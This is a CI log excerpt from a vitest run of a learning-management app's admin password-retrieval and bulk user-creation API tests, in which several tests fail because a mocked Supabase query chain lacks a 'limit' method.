2025-11-18T17:35:25.9157740Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9158447Z 
2025-11-18T17:35:25.9160513Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mSecurity[2m > [22m[2mshould not expose sensitive data in error responses[22m[39m
2025-11-18T17:35:25.9162718Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9164427Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9165995Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:610:7
2025-11-18T17:35:25.9167956Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9169758Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9171800Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9173525Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9175276Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9177240Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9178741Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9180195Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9180929Z 
2025-11-18T17:35:25.9182799Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mError Handling[2m > [22m[2mshould handle password store errors gracefully[22m[39m
2025-11-18T17:35:25.9185199Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9187200Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9188751Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:658:7
2025-11-18T17:35:25.9190391Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9192151Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9193971Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9195764Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9197738Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9200055Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9201691Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9203279Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9204050Z 
2025-11-18T17:35:25.9205859Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mError Handling[2m > [22m[2mshould handle Supabase auth errors[22m[39m
2025-11-18T17:35:25.9207759Z Error retrieving passwords: Error: Supabase connection failed
2025-11-18T17:35:25.9209361Z     at Object.<anonymous> [90m(/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:668:15[90m)[39m
2025-11-18T17:35:25.9211264Z     at Object.mockCall [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/spy/dist/index.js:50:17[90m)[39m
2025-11-18T17:35:25.9213133Z     at Object.spy [as getUser] [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mtinyspy[24m/dist/index.js:42:80[90m)[39m
2025-11-18T17:35:25.9214904Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:40:75[90m)[39m
2025-11-18T17:35:25.9217025Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:679:13
2025-11-18T17:35:25.9218596Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:25.9220112Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:25.9221778Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:25.9223543Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9225331Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9226151Z 
2025-11-18T17:35:25.9229244Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mError Handling[2m > [22m[2mshould handle missing environment variables[22m[39m
2025-11-18T17:35:25.9231426Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.9233426Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.9235079Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:703:7
2025-11-18T17:35:25.9236975Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.9238785Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9240581Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9242492Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.9244296Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.9246132Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.9247986Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:25.9249484Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:25.9250203Z 
2025-11-18T17:35:26.3801387Z  [33m❯[39m __tests__/api/admin/bulk-create-users.test.ts [2m ([22m[2m14 tests[22m [2m|[22m [31m8 failed[39m[2m)[22m[90m 49[2mms[22m[39m
2025-11-18T17:35:26.3817778Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject requests with invalid token[22m[39m
2025-11-18T17:35:26.3819870Z [BULK-IMPORT] AUTH FAILURE: { authError: [32m'Invalid token'[39m, hasUser: [33mfalse[39m }
2025-11-18T17:35:26.3820522Z 
2025-11-18T17:35:26.3822246Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject non-admin users[22m[39m
2025-11-18T17:35:26.3823793Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3824481Z   timestamp: [32m'2025-11-18T17:35:26.339Z'[39m,
2025-11-18T17:35:26.3825075Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3826060Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3827557Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3828028Z   requestSize: [33m4[39m,
2025-11-18T17:35:26.3828444Z   userCount: [33m0[39m,
2025-11-18T17:35:26.3828782Z   stackTrace: [
2025-11-18T17:35:26.3829655Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3834605Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3836086Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:140:7'[39m,
2025-11-18T17:35:26.3837824Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.3839347Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.3840087Z   ],
2025-11-18T17:35:26.3840448Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.3840922Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.3841285Z }
2025-11-18T17:35:26.3841743Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.3842113Z 
2025-11-18T17:35:26.3843805Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould successfully create single user[22m[39m
2025-11-18T17:35:26.3844980Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3845554Z   timestamp: [32m'2025-11-18T17:35:26.358Z'[39m,
2025-11-18T17:35:26.3846073Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3847129Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3847929Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3848351Z   requestSize: [33m64[39m,
2025-11-18T17:35:26.3848756Z   userCount: [33m1[39m,
2025-11-18T17:35:26.3849074Z   stackTrace: [
2025-11-18T17:35:26.3849850Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3851106Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3852367Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:324:7'[39m,
2025-11-18T17:35:26.3853718Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.3855110Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.3855852Z   ],
2025-11-18T17:35:26.3856189Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.3856677Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.3857249Z }
2025-11-18T17:35:26.3857732Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.3858125Z 
2025-11-18T17:35:26.3859601Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould handle multiple users in batches[22m[39m
2025-11-18T17:35:26.3860832Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3861443Z   timestamp: [32m'2025-11-18T17:35:26.360Z'[39m,
2025-11-18T17:35:26.3861996Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3862943Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3863791Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3864247Z   requestSize: [33m13[39m,
2025-11-18T17:35:26.3864652Z   userCount: [33m0[39m,
2025-11-18T17:35:26.3864982Z   stackTrace: [
2025-11-18T17:35:26.3865817Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3867529Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3868920Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:381:7'[39m,
2025-11-18T17:35:26.3870322Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.3871776Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.3872544Z   ],
2025-11-18T17:35:26.3872880Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.3873398Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.3873789Z }
2025-11-18T17:35:26.3874294Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.3874692Z 
2025-11-18T17:35:26.3876200Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould handle existing users gracefully[22m[39m
2025-11-18T17:35:26.3877759Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3878387Z   timestamp: [32m'2025-11-18T17:35:26.363Z'[39m,
2025-11-18T17:35:26.3878943Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3879932Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3880966Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3881496Z   requestSize: [33m72[39m,
2025-11-18T17:35:26.3881908Z   userCount: [33m1[39m,
2025-11-18T17:35:26.3882241Z   stackTrace: [
2025-11-18T17:35:26.3883087Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3884389Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3885686Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:427:7'[39m,
2025-11-18T17:35:26.3887331Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.3888865Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.3889644Z   ],
2025-11-18T17:35:26.3889980Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.3890482Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.3890877Z }
2025-11-18T17:35:26.3891432Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.3891833Z 
2025-11-18T17:35:26.3893507Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mAuthentication and Authorization[2m > [22mshould reject non-admin users[39m
2025-11-18T17:35:26.3895015Z [31m     → expected 500 to be 403 // Object.is equality[39m
2025-11-18T17:35:26.3897125Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould successfully create single user[39m
2025-11-18T17:35:26.3898583Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:26.3900356Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould handle multiple users in batches[39m
2025-11-18T17:35:26.3901772Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:26.3903518Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould handle existing users gracefully[39m
2025-11-18T17:35:26.3904903Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:26.3906497Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould validate passwords[39m
2025-11-18T17:35:26.3908337Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:26.3909965Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould include invalid users in results[39m
2025-11-18T17:35:26.3911255Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:26.3912847Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould handle profile creation errors[39m
2025-11-18T17:35:26.3914116Z [31m     → expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:35:26.3915707Z [31m   [33m❯[31m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mError Handling[2m > [22mshould handle no valid users scenario[39m
2025-11-18T17:35:26.3917200Z [31m     → expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:35:26.3919204Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject requests without authorization header[22m[39m
2025-11-18T17:35:26.3920948Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.333Z
2025-11-18T17:35:26.3921573Z 
2025-11-18T17:35:26.3923164Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject requests with invalid token[22m[39m
2025-11-18T17:35:26.3924799Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.336Z
2025-11-18T17:35:26.3925503Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.3926061Z   authHeaderLength: [33m20[39m,
2025-11-18T17:35:26.3926551Z   tokenLength: [33m13[39m,
2025-11-18T17:35:26.3927404Z   tokenPrefix: [32m'invalid-token...'[39m,
2025-11-18T17:35:26.3928023Z   timestamp: [32m'2025-11-18T17:35:26.336Z'[39m
2025-11-18T17:35:26.3928454Z }
2025-11-18T17:35:26.3928900Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.3929541Z   authError: [32m'Invalid token'[39m,
2025-11-18T17:35:26.3930092Z   userFound: [33mfalse[39m,
2025-11-18T17:35:26.3930576Z   userId: [90mundefined[39m,
2025-11-18T17:35:26.3931131Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.3931680Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.3932234Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.3932737Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.3933103Z }
2025-11-18T17:35:26.3933248Z 
2025-11-18T17:35:26.3934920Z [90mstdout[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject non-admin users[22m[39m
2025-11-18T17:35:26.3937083Z 🚀 [BULK-IMPORT] API Handler started - NEW CODE VERSION 2025-11-18T17:35:26.339Z
2025-11-18T17:35:26.3937965Z [BULK-IMPORT] AUTH DEBUG: Token extraction: {
2025-11-18T17:35:26.3938645Z   authHeaderLength: [33m18[39m,
2025-11-18T17:35:26.3939144Z   tokenLength: [33m11[39m,
2025-11-18T17:35:26.3939666Z   tokenPrefix: [32m'valid-token...'[39m,
2025-11-18T17:35:26.3940254Z   timestamp: [32m'2025-11-18T17:35:26.339Z'[39m
2025-11-18T17:35:26.3940714Z }
2025-11-18T17:35:26.3941149Z [BULK-IMPORT] AUTH DEBUG: User resolution: {
2025-11-18T17:35:26.3941712Z   authError: [1mnull[22m,
2025-11-18T17:35:26.3942161Z   userFound: [33mtrue[39m,
2025-11-18T17:35:26.3942647Z   userId: [32m'user-123'[39m,
2025-11-18T17:35:26.3943230Z   userEmail: [90mundefined[39m,
2025-11-18T17:35:26.3943780Z   userCreatedAt: [90mundefined[39m,
2025-11-18T17:35:26.3944323Z   userAud: [90mundefined[39m,
2025-11-18T17:35:26.3944819Z   userRole: [90mundefined[39m
2025-11-18T17:35:26.3945179Z }
2025-11-18T17:35:26.3945655Z [BULK-IMPORT] ROLE QUERY DEBUG: Query parameters: {
2025-11-18T17:35:26.3946544Z   queryUserId: [32m'user-123'[39m,
2025-11-18T17:35:26.3947267Z   userIdType: [32m'string'[39m,
2025-11-18T17:35:26.3947750Z   userIdLength: [33m8[39m,
2025-11-18T17:35:26.3948469Z   expectedUserId: [32m'4ae17b21-8977-425c-b05a-ca7cdb8b9df5'[39m,
2025-11-18T17:35:26.3949167Z   userIdMatch: [33mfalse[39m,
2025-11-18T17:35:26.3949740Z   supabaseClientConfigured: [33mtrue[39m,
2025-11-18T17:35:26.3950776Z   queryFilters: { user_id: [32m'user-123'[39m, role_type: [32m'admin'[39m, is_active: [33mtrue[39m }
2025-11-18T17:35:26.3951489Z }
2025-11-18T17:35:26.3951642Z 
2025-11-18T17:35:26.3953158Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould validate passwords[22m[39m
2025-11-18T17:35:26.3954443Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3955101Z   timestamp: [32m'2025-11-18T17:35:26.365Z'[39m,
2025-11-18T17:35:26.3955683Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3956687Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3957854Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3958317Z   requestSize: [33m8[39m,
2025-11-18T17:35:26.3958741Z   userCount: [33m0[39m,
2025-11-18T17:35:26.3959082Z   stackTrace: [
2025-11-18T17:35:26.3960137Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3961456Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3962779Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:470:7'[39m,
2025-11-18T17:35:26.3964185Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.3965668Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.3966457Z   ],
2025-11-18T17:35:26.3966962Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.3967477Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.3967874Z }
2025-11-18T17:35:26.3968392Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.3968804Z 
2025-11-18T17:35:26.3970376Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould include invalid users in results[22m[39m
2025-11-18T17:35:26.3971717Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3972357Z   timestamp: [32m'2025-11-18T17:35:26.367Z'[39m,
2025-11-18T17:35:26.3972945Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3973961Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3974848Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3975317Z   requestSize: [33m8[39m,
2025-11-18T17:35:26.3975742Z   userCount: [33m0[39m,
2025-11-18T17:35:26.3976086Z   stackTrace: [
2025-11-18T17:35:26.3977132Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3978497Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3979836Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:521:7'[39m,
2025-11-18T17:35:26.3981261Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.3982823Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.3983611Z   ],
2025-11-18T17:35:26.3983965Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.3984692Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.3985097Z }
2025-11-18T17:35:26.3985609Z [BULK-IMPORT] Top-level error category: database_connection
2025-11-18T17:35:26.3986064Z 
2025-11-18T17:35:26.3987809Z [90mstderr[2m | __tests__/api/admin/bulk-create-users.test.ts[2m > [22m[2m/api/admin/bulk-create-users[2m > [22m[2mUser Creation[2m > [22m[2mshould handle profile creation errors[22m[39m
2025-11-18T17:35:26.3989181Z [BULK-IMPORT] Top-level handler error: {
2025-11-18T17:35:26.3989850Z   timestamp: [32m'2025-11-18T17:35:26.369Z'[39m,
2025-11-18T17:35:26.3990452Z   errorType: [32m'TypeError'[39m,
2025-11-18T17:35:26.3991458Z   errorMessage: [32m'supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3992338Z   errorCode: [90mundefined[39m,
2025-11-18T17:35:26.3992811Z   requestSize: [33m8[39m,
2025-11-18T17:35:26.3993226Z   userCount: [33m0[39m,
2025-11-18T17:35:26.3993564Z   stackTrace: [
2025-11-18T17:35:26.3994450Z     [32m'TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function'[39m,
2025-11-18T17:35:26.3995793Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/admin/bulk-create-users.ts:171:8)'[39m,
2025-11-18T17:35:26.3997420Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/admin/bulk-create-users.test.ts:614:7'[39m,
2025-11-18T17:35:26.3998995Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)'[39m,
2025-11-18T17:35:26.4000454Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)'[39m
2025-11-18T17:35:26.4001252Z   ],
2025-11-18T17:35:26.4001588Z   nodeEnv: [32m'test'[39m,
2025-11-18T17:35:26.4002073Z   supabaseConfigured: [33mtrue[39m
2025-11-18T17:35:26.4002462Z }
